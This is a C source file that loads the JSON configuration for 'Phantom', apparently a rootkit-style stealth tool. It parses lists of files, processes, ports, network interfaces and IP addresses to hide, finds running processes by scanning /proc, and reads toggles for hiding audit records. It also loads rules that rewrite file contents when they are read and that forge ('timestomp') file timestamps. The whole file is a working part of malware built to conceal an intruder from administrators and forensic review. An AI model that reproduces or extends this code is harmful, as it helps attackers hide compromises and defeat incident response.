/* SPDX-License-Identifier: MIT */
/*
 * config.c - Minimal JSON config loader for Phantom hide targets.
 *
 * Fixed schema, no external JSON library. Parses hide lists, feature
 * toggles, file filters, and timestomp rules into phantom_cli_config.
 */

#include "config.h"
#include "phantom_build.h"
#include "log.h"

#include <ctype.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>

/*
 * parse_ctx - Cursor over a JSON text buffer.
 *
 * p:   Current read position
 * end: One past the last valid byte
 */
struct parse_ctx {
    const char *p;
    const char *end;
};

static int skip_value(struct parse_ctx *ctx);

/*
 * skip_ws - Advance past ASCII whitespace.
 */
static void skip_ws(struct parse_ctx *ctx)
{
    while (ctx->p < ctx->end && isspace((unsigned char)*ctx->p))
        ctx->p++;
}

/*
 * expect - Require the next non-whitespace character to be c, then consume it.
 *
 * Returns: 0 on match, -1 otherwise
 */
static int expect(struct parse_ctx *ctx, char c)
{
    skip_ws(ctx);
    if (ctx->p >= ctx->end || *ctx->p != c)
        return -1;
    ctx->p++;
    return 0;
}

/*
 * parse_string - Parse a JSON string into a newly allocated C string.
 *
 * Handles \\, \n, \t, and \r escapes. Caller must free *out.
 *
 * Returns: 0 on success, -1 on parse or allocation failure
 */
static int parse_string(struct parse_ctx *ctx, char **out)
{
    skip_ws(ctx);
    if (ctx->p >= ctx->end || *ctx->p != '"')
        return -1;
    ctx->p++;

    const char *start = ctx->p;
    while (ctx->p < ctx->end && *ctx->p != '"') {
        if (*ctx->p == '\\' && ctx->p + 1 < ctx->end)
            ctx->p += 2;
        else
            ctx->p++;
    }
    if (ctx->p >= ctx->end)
        return -1;

    size_t len = (size_t)(ctx->p - start);
    char *s = malloc(len + 1);
    if (!s)
        return -1;

    size_t j = 0;
    for (size_t i = 0; i < len; i++) {
        if (start[i] == '\\' && i + 1 < len) {
            i++;
            if (start[i] == 'n')
                s[j++] = '\n';
            else if (start[i] == 't')
                s[j++] = '\t';
            else if (start[i] == 'r')
                s[j++] = '\r';
            else
                s[j++] = start[i];
        } else {
            s[j++] = start[i];
        }
    }
    s[j] = '\0';
    ctx->p++;
    *out = s;
    return 0;
}

/*
 * parse_u32 - Parse an unsigned decimal integer.
 *
 * Returns: 0 on success, -1 if missing or out of uint32 range
 */
static int parse_u32(struct parse_ctx *ctx, uint32_t *out)
{
    skip_ws(ctx);
    char *endp = NULL;
    unsigned long v = strtoul(ctx->p, &endp, 10);
    if (endp == ctx->p)
        return -1;
    if (v > UINT32_MAX)
        return -1;
    ctx->p = endp;
    *out = (uint32_t)v;
    return 0;
}

/*
 * parse_bool - Parse JSON true or false.
 *
 * Returns: 0 on success, -1 otherwise
 */
static int parse_bool(struct parse_ctx *ctx, bool *out)
{
    skip_ws(ctx);
    if (ctx->p + 4 <= ctx->end && !strncmp(ctx->p, "true", 4)) {
        *out = true;
        ctx->p += 4;
        return 0;
    }
    if (ctx->p + 5 <= ctx->end && !strncmp(ctx->p, "false", 5)) {
        *out = false;
        ctx->p += 5;
        return 0;
    }
    return -1;
}

/*
 * parse_string_array - Parse a JSON string array into arr.
 *
 * Extra entries past max are warned and freed. label is used in log messages.
 *
 * Returns: 0 on success, -1 on parse error
 */
static int parse_string_array(struct parse_ctx *ctx, char **arr, int *count, int max,
                              const char *label)
{
    if (expect(ctx, '['))
        return -1;

    skip_ws(ctx);
    if (ctx->p < ctx->end && *ctx->p == ']') {
        ctx->p++;
        return 0;
    }

    for (;;) {
        char *s = NULL;
        if (parse_string(ctx, &s))
            return -1;
        if (*count >= max) {
            LOG_WARN("Config: max %s entries (%d), ignoring %s", label, max, s);
            free(s);
        } else {
            arr[(*count)++] = s;
        }
        skip_ws(ctx);
        if (ctx->p < ctx->end && *ctx->p == ',') {
            ctx->p++;
            continue;
        }
        break;
    }

    return expect(ctx, ']');
}

/*
 * parse_u32_array - Parse a JSON array of unsigned integers into arr.
 *
 * Extra entries past max are warned and skipped. label is used in log messages.
 *
 * Returns: 0 on success, -1 on parse error
 */
static int parse_u32_array(struct parse_ctx *ctx, uint32_t *arr, int *count, int max,
                           const char *label)
{
    if (expect(ctx, '['))
        return -1;

    skip_ws(ctx);
    if (ctx->p < ctx->end && *ctx->p == ']') {
        ctx->p++;
        return 0;
    }

    for (;;) {
        uint32_t v = 0;
        if (parse_u32(ctx, &v))
            return -1;
        if (*count >= max) {
            LOG_WARN("Config: max %s entries (%d), ignoring %u", label, max, v);
        } else {
            arr[(*count)++] = v;
        }
        skip_ws(ctx);
        if (ctx->p < ctx->end && *ctx->p == ',') {
            ctx->p++;
            continue;
        }
        break;
    }

    return expect(ctx, ']');
}

/*
 * pid_in_list - Return 1 if pid is already in pids[0..count).
 */
static int pid_in_list(uint32_t pid, const uint32_t *pids, int count)
{
    for (int i = 0; i < count; i++) {
        if (pids[i] == pid)
            return 1;
    }
    return 0;
}

/*
 * comm_matches - Match a process name, with or without a path prefix.
 *
 * "sshd" matches "sshd" and "/usr/sbin/sshd".
 * "/usr/sbin/sshd" also matches comm/cmdline basename "sshd".
 */
static int comm_matches(const char *comm, const char *want)
{
    if (!strcmp(comm, want))
        return 1;
    const char *slash = strrchr(comm, '/');
    if (slash && !strcmp(slash + 1, want))
        return 1;
    const char *want_base = strrchr(want, '/');
    if (want_base && *(want_base + 1) && !strcmp(comm, want_base + 1))
        return 1;
    return 0;
}

/*
 * read_proc_exe - Read /proc/<pid>/exe into exe (strip " (deleted)").
 *
 * Returns: 0 on success, -1 on failure
 */
static int read_proc_exe(uint32_t pid, char *exe, size_t exe_len)
{
    char linkpath[64];
    snprintf(linkpath, sizeof(linkpath), "/proc/%u/exe", pid);
    ssize_t n = readlink(linkpath, exe, exe_len - 1);
    if (n < 0)
        return -1;
    exe[n] = '\0';

    char *deleted = strstr(exe, " (deleted)");
    if (deleted)
        *deleted = '\0';
    return 0;
}

/*
 * read_proc_comm - Read /proc/<pid>/comm into comm (newline stripped).
 *
 * Returns: 0 on success, -1 on failure
 */
static int read_proc_comm(uint32_t pid, char *comm, size_t comm_len)
{
    char path[64];
    snprintf(path, sizeof(path), "/proc/%u/comm", pid);

    FILE *f = fopen(path, "r");
    if (!f)
        return -1;

    if (!fgets(comm, comm_len, f)) {
        fclose(f);
        return -1;
    }
    fclose(f);

    size_t len = strlen(comm);
    if (len && comm[len - 1] == '\n')
        comm[len - 1] = '\0';
    return 0;
}

/*
 * read_proc_cmdline_basename - Read argv0 basename from /proc/<pid>/cmdline.
 *
 * cmdline is NUL-separated; only the first argument is used, then the
 * trailing path component is kept (e.g. /usr/bin/sshd -> sshd).
 *
 * Returns: 0 on success, -1 on failure
 */
static int read_proc_cmdline_basename(uint32_t pid, char *base, size_t base_len)
{
    char path[64];
    char buf[4096];
    snprintf(path, sizeof(path), "/proc/%u/cmdline", pid);

    FILE *f = fopen(path, "r");
    if (!f)
        return -1;

    size_t n = fread(buf, 1, sizeof(buf) - 1, f);
    fclose(f);
    if (n == 0)
        return -1;
    buf[n] = '\0';

    const char *name = buf;
    const char *slash = strrchr(name, '/');
    if (slash && *(slash + 1))
        name = slash + 1;

    strncpy(base, name, base_len - 1);
    base[base_len - 1] = '\0';
    return 0;
}

/*
 * cmdline_arg_matches - True if any /proc/<pid>/cmdline arg matches want.
 *
 * cmdline is NUL-separated. Each arg is compared with comm_matches, so
 * "phantom" matches "./phantom", "/opt/bin/phantom", and a sudo cmdline
 * like "sudo\\0./phantom\\0daemon". "run.sh" matches "bash\\0run.sh".
 *
 * Returns: 1 on match, 0 otherwise
 */
static int cmdline_arg_matches(uint32_t pid, const char *want)
{
    char path[64];
    char buf[4096];
    snprintf(path, sizeof(path), "/proc/%u/cmdline", pid);

    FILE *f = fopen(path, "r");
    if (!f)
        return 0;

    size_t n = fread(buf, 1, sizeof(buf) - 1, f);
    fclose(f);
    if (n == 0)
        return 0;
    buf[n] = '\0';

    size_t i = 0;
    while (i < n) {
        const char *arg = buf + i;
        if (arg[0] && comm_matches(arg, want))
            return 1;
        i += strlen(arg) + 1;
    }
    return 0;
}

/*
 * resolve_one_name - Find running PIDs matching name.
 *
 * Absolute paths (leading '/') match /proc/<pid>/exe exactly.
 * Other names match:
 *   - /proc/<pid>/comm
 *   - argv0 basename
 *   - any cmdline argument basename (covers "sudo ./phantom" / "bash run.sh")
 *   - /proc/<pid>/exe basename
 *
 * Appends matching PIDs to pids without duplicates, up to max entries.
 *
 * Returns: 0 on success (including "none found"), -1 if /proc cannot be opened
 */
static int resolve_one_name(const char *name, uint32_t *pids, int *pid_count, int max)
{
    DIR *proc = opendir("/proc");
    if (!proc) {
        LOG_ERROR("Cannot open /proc: %s", strerror(errno));
        return -1;
    }

    int is_path = (name[0] == '/');
    int found = 0;
    struct dirent *de;
    while ((de = readdir(proc)) != NULL) {
        if (de->d_name[0] < '1' || de->d_name[0] > '9')
            continue;

        uint32_t pid = (uint32_t)strtoul(de->d_name, NULL, 10);
        if (pid == 0)
            continue;

        char comm[TASK_COMM_LEN + 1] = {};
        char cmdbase[MAX_FILENAME_LEN] = {};
        char exe[MAX_PATH_LEN] = {};
        const char *how = NULL;
        int match = 0;

        if (is_path) {
            if (read_proc_exe(pid, exe, sizeof(exe)) == 0 &&
                !strcmp(exe, name)) {
                match = 1;
                how = "exe";
            }
        } else if (read_proc_comm(pid, comm, sizeof(comm)) == 0 &&
                   comm_matches(comm, name)) {
            match = 1;
            how = "comm";
        } else if (read_proc_cmdline_basename(pid, cmdbase, sizeof(cmdbase)) == 0 &&
                   comm_matches(cmdbase, name)) {
            match = 1;
            how = "argv0";
        } else if (cmdline_arg_matches(pid, name)) {
            match = 1;
            how = "cmdline";
        } else if (read_proc_exe(pid, exe, sizeof(exe)) == 0 &&
                   comm_matches(exe, name)) {
            match = 1;
            how = "exe";
        }

        if (!match)
            continue;

        if (pid_in_list(pid, pids, *pid_count)) {
            found = 1;
            continue;
        }
        if (*pid_count >= max) {
            LOG_WARN("Max PID entries (%d) reached while resolving %s", max, name);
            closedir(proc);
            return 0;
        }
        pids[(*pid_count)++] = pid;
        found = 1;
        if (is_path)
            LOG_INFO("Resolved process path %s -> PID %u", name, pid);
        else
            LOG_INFO("Resolved process %s -> PID %u (%s)", name, pid,
                     how ? how : "?");
    }

    closedir(proc);
    if (!found)
        LOG_WARN("No running process matched %s: %s",
                 is_path ? "path" : "name", name);
    return 0;
}

/*
 * resolve_one_path_prefix - Find PIDs whose /proc/<pid>/exe starts with prefix.
 *
 * Returns: 0 on success (including "none found"), -1 if /proc cannot be opened
 */
static int resolve_one_path_prefix(const char *prefix, uint32_t *pids,
                                   int *pid_count, int max)
{
    DIR *proc = opendir("/proc");
    if (!proc) {
        LOG_ERROR("Cannot open /proc: %s", strerror(errno));
        return -1;
    }

    size_t plen = strlen(prefix);
    int found = 0;
    struct dirent *de;
    while ((de = readdir(proc)) != NULL) {
        if (de->d_name[0] < '1' || de->d_name[0] > '9')
            continue;

        uint32_t pid = (uint32_t)strtoul(de->d_name, NULL, 10);
        if (pid == 0)
            continue;

        char exe[MAX_PATH_LEN] = {};
        if (read_proc_exe(pid, exe, sizeof(exe)) != 0)
            continue;
        if (strncmp(exe, prefix, plen) != 0)
            continue;

        if (pid_in_list(pid, pids, *pid_count)) {
            found = 1;
            continue;
        }
        if (*pid_count >= max) {
            LOG_WARN("Max PID entries (%d) reached while resolving prefix %s",
                     max, prefix);
            closedir(proc);
            return 0;
        }
        pids[(*pid_count)++] = pid;
        found = 1;
        LOG_INFO("Resolved process prefix %s -> PID %u (exe=%s)", prefix, pid, exe);
    }

    closedir(proc);
    if (!found)
        LOG_WARN("No running process matched path prefix: %s", prefix);
    return 0;
}

/*
 * parse_file_filter_entry - Parse one {path,search,replace,mode} object.
 */
static int parse_file_filter_entry(struct parse_ctx *ctx,
                                   struct phantom_cli_config *cfg)
{
    if (cfg->file_filter_count >= MAX_FILE_FILTERS) {
        LOG_WARN("Too many file filters, ignoring");
        return skip_value(ctx);
    }

    struct file_filter_entry *entry =
        &cfg->file_filters[cfg->file_filter_count];

    if (expect(ctx, '{'))
        return -1;

    skip_ws(ctx);
    while (ctx->p < ctx->end && *ctx->p != '}') {
        char *key = NULL;
        if (parse_string(ctx, &key))
            return -1;
        if (expect(ctx, ':'))
            return (free(key), -1);

        if (!strcmp(key, "path")) {
            if (parse_string(ctx, &entry->path)) {
                free(key);
                return -1;
            }
        } else if (!strcmp(key, "search")) {
            if (parse_string(ctx, &entry->search)) {
                free(key);
                return -1;
            }
        } else if (!strcmp(key, "replace")) {
            if (parse_string(ctx, &entry->replace)) {
                free(key);
                return -1;
            }
        } else if (!strcmp(key, "mode")) {
            char *mode_str = NULL;
            if (parse_string(ctx, &mode_str)) {
                free(key);
                return -1;
            }
            if (!strcmp(mode_str, "hide"))
                entry->mode = FILE_FILTER_MODE_HIDE;
            else if (!strcmp(mode_str, "replace"))
                entry->mode = FILE_FILTER_MODE_REPLACE;
            else {
                LOG_WARN("Unknown file filter mode: %s", mode_str);
                free(mode_str);
                free(key);
                return -1;
            }
            free(mode_str);
        } else {
            skip_value(ctx);
        }

        free(key);
        skip_ws(ctx);
        if (ctx->p < ctx->end && *ctx->p == ',') {
            ctx->p++;
            skip_ws(ctx);
        }
    }

    if (expect(ctx, '}'))
        return -1;

    /* Set defaults */
    if (!entry->replace)
        entry->replace = strdup("");

    cfg->file_filter_count++;
    return 0;
}

/*
 * parse_file_filters_array - Parse the file_filters JSON array
 */
static int parse_file_filters_array(struct parse_ctx *ctx,
                                    struct phantom_cli_config *cfg)
{
    if (expect(ctx, '['))
        return -1;

    skip_ws(ctx);
    if (ctx->p < ctx->end && *ctx->p == ']') {
        ctx->p++;
        return 0;
    }

    for (;;) {
        if (parse_file_filter_entry(ctx, cfg))
            return -1;

        skip_ws(ctx);
        if (ctx->p < ctx->end && *ctx->p == ',') {
            ctx->p++;
            continue;
        }
        break;
    }

    return expect(ctx, ']');
}

/*
 * phantom_config_init - Zero a config struct before loading or reuse.
 */
void phantom_config_init(struct phantom_cli_config *cfg)
{
    memset(cfg, 0, sizeof(*cfg));
}

/*
 * phantom_config_free - Free all heap strings owned by cfg, then zero it.
 */
void phantom_config_free(struct phantom_cli_config *cfg)
{
    for (int i = 0; i < cfg->file_count; i++)
        free(cfg->files[i]);
    for (int i = 0; i < cfg->prefix_count; i++)
        free(cfg->prefixes[i]);
    for (int i = 0; i < cfg->process_name_count; i++)
        free(cfg->process_names[i]);
    for (int i = 0; i < cfg->process_path_prefix_count; i++)
        free(cfg->process_path_prefixes[i]);
    for (int i = 0; i < cfg->exec_name_count; i++)
        free(cfg->exec_names[i]);
    for (int i = 0; i < cfg->iface_count; i++)
        free(cfg->iface_names[i]);
    for (int i = 0; i < cfg->ip_count; i++)
        free(cfg->ip_addrs[i]);
    for (int i = 0; i < cfg->file_filter_count; i++) {
        free(cfg->file_filters[i].path);
        free(cfg->file_filters[i].search);
        free(cfg->file_filters[i].replace);
    }
    for (int i = 0; i < cfg->file_filter_exempt_count; i++)
        free(cfg->file_filter_exempts[i]);
    for (int i = 0; i < cfg->timestomp_rule_count; i++) {
        free(cfg->timestomp_rules[i].path);
        free(cfg->timestomp_rules[i].timestamp);
    }
    free(cfg->global_timestomp_timestamp);
    phantom_config_init(cfg);
}

/*
 * phantom_config_resolve_processes - Turn process_names into concrete PIDs.
 *
 * Scans /proc for each configured name and appends matches to cfg->pids.
 *
 * Returns: 0 on success, -1 on /proc errors
 */
int phantom_config_resolve_processes(struct phantom_cli_config *cfg)
{
    for (int i = 0; i < cfg->process_name_count; i++) {
        int rc = resolve_one_name(cfg->process_names[i],
                                  cfg->pids, &cfg->pid_count,
                                  MAX_HIDDEN_PIDS);
        if (rc)
            return rc;
    }
    for (int i = 0; i < cfg->process_path_prefix_count; i++) {
        int rc = resolve_one_path_prefix(cfg->process_path_prefixes[i],
                                         cfg->pids, &cfg->pid_count,
                                         MAX_HIDDEN_PIDS);
        if (rc)
            return rc;
    }
    return 0;
}

/*
 * phantom_config_validate_file_filters - Reject duplicate filter paths.
 *
 * Only one filter rule per path is allowed.
 *
 * Returns: 0 if unique, -1 if a duplicate is found
 */
int phantom_config_validate_file_filters(const struct phantom_cli_config *cfg)
{
    for (int i = 0; i < cfg->file_filter_count; i++) {
        const char *path = cfg->file_filters[i].path;
        if (!path || !path[0])
            continue;
        for (int j = i + 1; j < cfg->file_filter_count; j++) {
            const char *other = cfg->file_filters[j].path;
            if (other && !strcmp(path, other)) {
                LOG_ERROR("Duplicate file filter for path: %s "
                          "(only one filter per file is allowed)", path);
                return -1;
            }
        }
    }
    return 0;
}

/*
 * apply_key - Dispatch one top-level JSON key into cfg fields.
 *
 * Unknown keys are logged and skipped. Some keys have hyphenated aliases
 * (e.g. enable-iface) for CLI familiarity.
 *
 * Returns: 0 on success, -1 on parse error
 */
static int apply_key(struct phantom_cli_config *cfg, const char *key, struct parse_ctx *val)
{
    if (!strcmp(key, "files"))
        return parse_string_array(val, cfg->files, &cfg->file_count,
                                MAX_HIDDEN_FILES, "file");
    if (!strcmp(key, "prefixes"))
        return parse_string_array(val, cfg->prefixes, &cfg->prefix_count,
                                  MAX_HIDDEN_PREFIXES, "prefix");
    if (!strcmp(key, "processes") || !strcmp(key, "process_names"))
        return parse_string_array(val, cfg->process_names, &cfg->process_name_count,
                                  MAX_HIDDEN_PIDS, "process");
    if (!strcmp(key, "process_path_prefixes") || !strcmp(key, "process-path-prefixes"))
        return parse_string_array(val, cfg->process_path_prefixes,
                                  &cfg->process_path_prefix_count,
                                  MAX_HIDDEN_PROC_PATH_PREFIXES,
                                  "process_path_prefix");
    if (!strcmp(key, "pids"))
        return parse_u32_array(val, cfg->pids, &cfg->pid_count,
                             MAX_HIDDEN_PIDS, "PID");
    if (!strcmp(key, "ports"))
        return parse_u32_array(val, cfg->ports, &cfg->port_count,
                              MAX_HIDDEN_PORTS, "port");
    if (!strcmp(key, "exec_names") || !strcmp(key, "exec"))
        return parse_string_array(val, cfg->exec_names, &cfg->exec_name_count,
                                  MAX_HIDDEN_EXEC_NAMES, "exec_name");
    if (!strcmp(key, "ifaces") || !strcmp(key, "iface_names"))
        return parse_string_array(val, cfg->iface_names, &cfg->iface_count,
                                  MAX_HIDDEN_IFACES, "iface");
    if (!strcmp(key, "ips") || !strcmp(key, "ip_addrs"))
        return parse_string_array(val, cfg->ip_addrs, &cfg->ip_count,
                                  MAX_HIDDEN_IPS, "ip_addr");
    if (!strcmp(key, "ppid")) {
        uint32_t ppid = 0;
        if (parse_u32(val, &ppid))
            return -1;
        cfg->target_ppid = ppid;
        cfg->set_ppid = true;
        return 0;
    }
    if (!strcmp(key, "enable_files")) {
        bool v = false;
        if (parse_bool(val, &v))
            return -1;
        cfg->enable_files = v;
        cfg->set_enable_files = true;
        return 0;
    }
    if (!strcmp(key, "enable_procs") || !strcmp(key, "enable_processes")) {
        bool v = false;
        if (parse_bool(val, &v))
            return -1;
        cfg->enable_procs = v;
        cfg->set_enable_procs = true;
        return 0;
    }
    if (!strcmp(key, "enable_ports")) {
        bool v = false;
        if (parse_bool(val, &v))
            return -1;
        cfg->enable_ports = v;
        cfg->set_enable_ports = true;
        return 0;
    }
    if (!strcmp(key, "enable_audit")) {
        bool v = false;
        if (parse_bool(val, &v))
            return -1;
        cfg->enable_audit = v;
        cfg->set_enable_audit = true;
        return 0;
    }
    if (!strcmp(key, "enable_timestomp")) {
        bool v = false;
        if (parse_bool(val, &v))
            return -1;
        cfg->enable_timestomp = v;
        cfg->set_enable_timestomp = true;
        return 0;
    }
    if (!strcmp(key, "timestomp_global")) {
        char *s = NULL;
        if (parse_string(val, &s))
            return -1;
        cfg->global_timestomp_timestamp = s;
        return 0;
    }
    if (!strcmp(key, "timestomp_rules")) {
        /* Parse array of timestomp rule objects */
        if (expect(val, '['))
            return -1;
        skip_ws(val);
        if (val->p < val->end && *val->p == ']') {
            val->p++;
            return 0;
        }
        for (;;) {
            if (cfg->timestomp_rule_count >= MAX_TIMESTOMP_RULES) {
                LOG_WARN("Too many timestomp rules, ignoring");
                if (skip_value(val))
                    return -1;
            } else {
                /* Parse { "path": "...", "timestamp": "..." } */
                if (expect(val, '{'))
                    return -1;
                struct timestomp_rule *rule = &cfg->timestomp_rules[cfg->timestomp_rule_count];
                skip_ws(val);
                while (val->p < val->end && *val->p != '}') {
                    char *rkey = NULL;
                    if (parse_string(val, &rkey))
                        return -1;
                    if (expect(val, ':'))
                        return (free(rkey), -1);
                    if (!strcmp(rkey, "path")) {
                        if (parse_string(val, &rule->path)) {
                            free(rkey);
                            return -1;
                        }
                    } else if (!strcmp(rkey, "timestamp")) {
                        if (parse_string(val, &rule->timestamp)) {
                            free(rkey);
                            return -1;
                        }
                    } else {
                        if (skip_value(val)) {
                            free(rkey);
                            return -1;
                        }
                    }
                    free(rkey);
                    skip_ws(val);
                    if (val->p < val->end && *val->p == ',') {
                        val->p++;
                        skip_ws(val);
                    }
                }
                if (expect(val, '}'))
                    return -1;
                if (rule->path && rule->timestamp)
                    cfg->timestomp_rule_count++;
            }
            skip_ws(val);
            if (val->p < val->end && *val->p == ',') {
                val->p++;
                continue;
            }
            break;
        }
        return expect(val, ']');
    }
    if (!strcmp(key, "enable_exec")) {
        bool v = false;
        if (parse_bool(val, &v))
            return -1;
        cfg->enable_exec = v;
        cfg->set_enable_exec = true;
        return 0;
    }
    if (!strcmp(key, "enable_iface") || !strcmp(key, "enable-iface")) {
        bool v = false;
        if (parse_bool(val, &v))
            return -1;
        cfg->enable_iface = v;
        cfg->set_enable_iface = true;
        return 0;
    }
    if (!strcmp(key, "enable_ip") || !strcmp(key, "enable-ip")) {
        bool v = false;
        if (parse_bool(val, &v))
            return -1;
        cfg->enable_ip = v;
        cfg->set_enable_ip = true;
        return 0;
    }
    if (!strcmp(key, "file_filters") || !strcmp(key, "file-filters")) {
        return parse_file_filters_array(val, cfg);
    }
    if (!strcmp(key, "file_filter_exempts") || !strcmp(key, "file-filter-exempts")) {
        return parse_string_array(val, cfg->file_filter_exempts,
                                  &cfg->file_filter_exempt_count,
                                  MAX_FILE_FILTER_EXEMPTS, "file_filter_exempt");
    }
    if (!strcmp(key, "enable_file_filter") || !strcmp(key, "enable-file-filter")) {
        bool v = false;
        if (parse_bool(val, &v))
            return -1;
        cfg->enable_file_filter = v;
        cfg->set_enable_file_filter = true;
        return 0;
    }

    LOG_WARN("Config: unknown key %s (ignored)", key);
    return skip_value(val);
}

/*
 * skip_value - Consume one JSON value without storing it.
 *
 * Used for unknown keys and overflow entries. Handles object, array,
 * string, number, bool, and null.
 *
 * Returns: 0 on success, -1 on malformed input
 */
static int skip_value(struct parse_ctx *ctx)
{
    skip_ws(ctx);
    if (ctx->p >= ctx->end)
        return -1;

    char c = *ctx->p;
    if (c == '"') {
        char *tmp = NULL;
        return parse_string(ctx, &tmp) ? -1 : (free(tmp), 0);
    }
    if (c == '{') {
        ctx->p++;
        skip_ws(ctx);
        if (ctx->p < ctx->end && *ctx->p == '}')
            return (ctx->p++, 0);
        for (;;) {
            char *k = NULL;
            if (parse_string(ctx, &k))
                return -1;
            free(k);
            if (expect(ctx, ':'))
                return -1;
            if (skip_value(ctx))
                return -1;
            skip_ws(ctx);
            if (ctx->p < ctx->end && *ctx->p == ',') {
                ctx->p++;
                continue;
            }
            break;
        }
        return expect(ctx, '}');
    }
    if (c == '[') {
        ctx->p++;
        skip_ws(ctx);
        if (ctx->p < ctx->end && *ctx->p == ']')
            return (ctx->p++, 0);
        for (;;) {
            if (skip_value(ctx))
                return -1;
            skip_ws(ctx);
            if (ctx->p < ctx->end && *ctx->p == ',') {
                ctx->p++;
                continue;
            }
            break;
        }
        return expect(ctx, ']');
    }
    if (c == 't' || c == 'f') {
        bool b = false;
        return parse_bool(ctx, &b);
    }
    if (c == 'n') {
        if (ctx->p + 4 <= ctx->end && !strncmp(ctx->p, "null", 4)) {
            ctx->p += 4;
            return 0;
        }
        return -1;
    }
    if (c == '-' || isdigit((unsigned char)c)) {
        uint32_t dummy = 0;
        return parse_u32(ctx, &dummy);
    }
    return -1;
}

/*
 * parse_object - Parse the top-level { "key": value, ... } config object.
 *
 * Returns: 0 on success, -1 on parse error
 */
static int parse_object(struct parse_ctx *ctx, struct phantom_cli_config *cfg)
{
    if (expect(ctx, '{'))
        return -1;

    skip_ws(ctx);
    if (ctx->p < ctx->end && *ctx->p == '}') {
        ctx->p++;
        return 0;
    }

    for (;;) {
        char *key = NULL;
        if (parse_string(ctx, &key))
            return -1;
        if (expect(ctx, ':'))
            return (free(key), -1);
        if (apply_key(cfg, key, ctx)) {
            free(key);
            return -1;
        }
        free(key);

        skip_ws(ctx);
        if (ctx->p < ctx->end && *ctx->p == ',') {
            ctx->p++;
            continue;
        }
        break;
    }

    return expect(ctx, '}');
}

/*
 * load_file_internal - Read a JSON config file into cfg.
 *
 * Caps file size at 1 MiB. quiet=true softens log wording for the built-in
 * path (missing file is not always an error at the caller).
 *
 * Returns: 0 on success, -1 on I/O or parse failure
 */
static int load_file_internal(const char *path, struct phantom_cli_config *cfg,
                              bool quiet)
{
    FILE *f = fopen(path, "rb");
    if (!f) {
        if (!quiet)
            LOG_ERROR("Cannot open config %s: %s", path, strerror(errno));
        return -1;
    }

    if (fseek(f, 0, SEEK_END) != 0) {
        fclose(f);
        return -1;
    }
    long sz = ftell(f);
    /* Reject empty-looking failures and absurdly large configs. */
    if (sz < 0 || sz > 1024 * 1024) {
        fclose(f);
        if (!quiet)
            LOG_ERROR("Config file too large or unreadable: %s", path);
        else
            LOG_ERROR("Built-in configuration file too large");
        return -1;
    }
    rewind(f);

    char *buf = malloc((size_t)sz + 1);
    if (!buf) {
        fclose(f);
        return -1;
    }
    if (fread(buf, 1, (size_t)sz, f) != (size_t)sz) {
        free(buf);
        fclose(f);
        return -1;
    }
    fclose(f);
    buf[sz] = '\0';

    struct parse_ctx ctx = { .p = buf, .end = buf + sz };
    int rc = parse_object(&ctx, cfg);
    skip_ws(&ctx);
    if (rc == 0 && ctx.p != ctx.end) {
        if (quiet)
            LOG_WARN("Config: trailing data after JSON object");
        else
            LOG_WARN("Config: trailing data after JSON object in %s", path);
    }
    free(buf);
    if (rc == 0)
        rc = phantom_config_validate_file_filters(cfg);
    if (rc) {
        if (quiet)
            LOG_ERROR("Failed to parse built-in configuration");
        else
            LOG_ERROR("Failed to parse config %s", path);
    } else if (quiet) {
        LOG_DEBUG("Loaded built-in configuration");
    } else {
        LOG_INFO("Loaded config from %s", path);
    }
    return rc;
}

/*
 * phantom_config_load_file - Load a user-specified JSON config path.
 *
 * Returns: 0 on success, -1 on failure
 */
int phantom_config_load_file(const char *path, struct phantom_cli_config *cfg)
{
    return load_file_internal(path, cfg, false);
}

/*
 * phantom_config_load_builtin - Load PHANTOM_CONFIG_PATH if it exists.
 *
 * Missing file is not an error (returns 0). Other access failures warn
 * and also return 0 so the daemon can still start with empty defaults.
 *
 * Returns: 0 on success or skipped, -1 on parse failure
 */
int phantom_config_load_builtin(struct phantom_cli_config *cfg)
{
    if (access(PHANTOM_CONFIG_PATH, R_OK) != 0) {
        if (errno == ENOENT)
            return 0;
        LOG_WARN("Built-in configuration not readable");
        return 0;
    }
    return load_file_internal(PHANTOM_CONFIG_PATH, cfg, true);
}
